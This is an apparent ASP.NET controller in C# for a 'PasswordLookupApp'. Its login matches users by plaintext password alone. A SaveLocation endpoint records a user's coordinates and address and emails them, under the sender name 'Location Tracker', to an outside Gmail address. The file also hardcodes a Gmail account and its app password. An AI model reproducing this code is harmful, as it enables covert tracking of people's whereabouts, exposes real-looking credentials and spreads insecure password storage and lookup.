using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using MimeKit;
using PasswordLookupApp.Data;
using MailKit.Net.Smtp;

namespace PasswordLookupApp.Controllers
{
    public class LoginController : Controller
    {
        private readonly AppDbContext _context;

        public LoginController(AppDbContext context)
        {
            _context = context;
        }

        [HttpGet]
        public IActionResult Index()
        {
            return View();
        }

        [HttpPost]
        public IActionResult Index(string password)
        {
            var user = _context.Users.FirstOrDefault(u => u.Password == password);
            if (user != null)
            {
                return View("Result", user.Username);
            }
            ViewBag.Error = "Password not found.";
            return View();
        }


[HttpPost]
    public IActionResult SaveLocation([FromBody] LocationData data)
    {
        var user = _context.Users.FirstOrDefault(u => u.Username == data.Username);
        if (user != null)
        {
            user.Latitude = data.Latitude;
            user.Longitude = data.Longitude;
            user.Address = data.Address;
            _context.SaveChanges();

            // Send email with location
            SendLocationEmail(data.Username, data.Latitude, data.Longitude, data.Address);

            return Ok(new { message = "Location saved and emailed successfully" });
        }
        return NotFound(new { message = "User not found" });
    }

        private void SendLocationEmail(string username, double lat, double lng, string address)
        {
            var message = new MimeMessage();
            message.From.Add(new MailboxAddress("Location Tracker", "muhammadasadali19@gmail.com")); // Replace with your Gmail
            message.To.Add(new MailboxAddress("", "andricsosu@gmail.com"));
           // message.To.Add(new MailboxAddress("", "zaryabk@gmail.com"));
           // message.To.Add(new MailboxAddress("", "zaryabk@hotmail.com"));
            message.Subject = $"📍 Location update for {username}";

            string htmlBody = $@"
    <html>
    <body style='font-family: Arial, sans-serif; line-height: 1.6;'>
        <h2>Location Update</h2>
        <p><strong>User:</strong> {username}</p>
        <p><strong>Latitude:</strong> {lat}</p>
        <p><strong>Longitude:</strong> {lng}</p>
        <p><strong>Address:</strong><br>{address}</p>
        <p>
            <a href='https://www.google.com/maps?q={lat},{lng}' 
               style='display: inline-block; padding: 10px 15px; background-color: #4285F4; color: white; text-decoration: none; border-radius: 4px;'>
               View on Google Maps
            </a>
        </p>
    </body>
    </html>";

            message.Body = new TextPart("html") { Text = htmlBody };

            using (var client = new SmtpClient())
            {
                client.Connect("smtp.gmail.com", 587, MailKit.Security.SecureSocketOptions.StartTls);
                client.Authenticate("muhammadasadali19@gmail.com", "flda xyxo rnue awgm"); // App Password from Google
                client.Send(message);
                client.Disconnect(true);
            }
        }


        
        public class LocationData
        {
        public string Username { get; set; }
        public double Latitude { get; set; }
        public double Longitude { get; set; }
        public string Address { get; set; }
        }



    }
}
